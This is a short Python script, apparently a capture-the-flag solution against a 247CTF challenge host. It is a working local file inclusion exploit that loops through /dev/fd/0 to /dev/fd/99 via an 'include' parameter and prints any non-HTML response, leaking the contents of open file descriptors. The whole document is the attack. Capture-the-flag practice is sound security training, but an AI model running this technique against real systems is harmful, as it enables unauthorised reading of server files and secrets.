import requests
for i in range(100):
    url = f"https://2eca6643ee90f661.247ctf.com/?include=/dev/fd/{str(i)}"
    res = requests.get(url).text
    if res[0] != "<":
        print(res, i)
